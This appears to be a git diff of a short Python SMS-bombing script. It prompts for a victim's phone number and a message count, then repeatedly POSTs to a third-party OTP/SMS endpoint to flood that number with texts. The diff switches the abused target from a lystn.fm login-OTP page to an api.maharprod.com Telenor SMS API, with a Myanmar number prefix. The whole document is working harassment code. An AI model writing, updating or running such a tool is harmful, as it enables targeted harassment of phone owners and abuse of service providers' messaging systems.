@@ -21,26 +21,21 @@ def sms():
 ''','red'))
 
  headers = {
-    'Host': 'www.lystn.fm',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'Sec-Ch-Ua-Platform': '""',
     'Accept-Language': 'EN',
     'Sec-Ch-Ua-Mobile': '?0',
     'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Origin': 'https://www.lystn.fm',
-    'Sec-Fetch-Site': 'same-site',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Dest': 'document',
-    'Referer': 'https://www.lystn.fm/mlogin-otpsend.php',
+    'Content-Type': 'application/json',
 }
  
  in_ph=input("PHONE NUMBER [>]")
- full = f"%2B95{in_ph[1:]}"
+ in_ph1 = in_ph[1:]
+#full = f"%2B95{in_ph[1:]}"
  numb=int(input("MESSAGE COUNT [>]"))
- json_data = f"mobile={in_ph}&full_phone={full}"
+ json_data = {"phoneNumber": f"95{in_ph1}"}
  for i in range(0,numb):
-  response = requests.post('https://www.lystn.fm/mlogin-otpvalidate.php', headers=headers, data=json_data,)
+  response = requests.post('https://api.maharprod.com/sms/v1/movie/telenor/atom_sms', headers=headers, json=json_data)
 
   if response.status_code==200:
    print(colored("[success]",'blue'))
@@ -51,5 +46,3 @@ def sms():
  log_file.close()
 
 sms()
-
-
